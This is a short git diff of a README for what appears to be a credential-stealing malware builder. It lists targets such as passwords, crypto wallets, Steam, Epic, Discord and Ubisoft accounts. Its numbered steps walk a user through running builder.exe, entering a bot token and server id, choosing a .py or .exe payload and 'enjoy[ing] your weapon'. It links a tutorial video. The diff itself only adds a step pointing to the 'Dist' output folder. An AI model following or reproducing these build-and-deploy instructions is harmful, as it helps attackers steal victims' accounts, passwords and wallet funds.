@@ -110,7 +110,8 @@ Passwords,Wallets,Steam,Epic,Discord,Ubisoft and more.
 7. open builder.exe
 8. compile bot token & server id.
 9. decide if u want .py or .exe file.
-10. enjoy your weapon!
+10. If .exe Navigate To "Dist" folder
+11. enjoy your weapon.
 
 [![Tutorial video](https://img.shields.io/badge/Watch-Tutorial-blue?style=for-the-badge&logo=youtube)](https://streamable.com/r9sa14)
 
